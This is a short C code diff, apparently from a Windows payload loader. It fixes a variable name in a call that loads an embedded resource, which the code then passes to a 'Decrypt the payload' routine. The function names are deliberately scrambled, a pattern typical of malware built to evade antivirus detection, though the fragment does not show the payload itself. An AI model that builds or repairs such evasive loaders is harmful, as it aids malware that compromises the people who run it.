@@ -29,7 +29,7 @@ int main() {
 
     char* codfhu;
     DWORD codfhuLen;
-    lalijojoloadres("dhanushcode56", &codfhu, &c1o2d3e4EncLen);
+    lalijojoloadres("dhanushcode56", &codfhu, &codfhuLen);
 
     // Decrypt the payload
     ccccdeckumcrpt(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
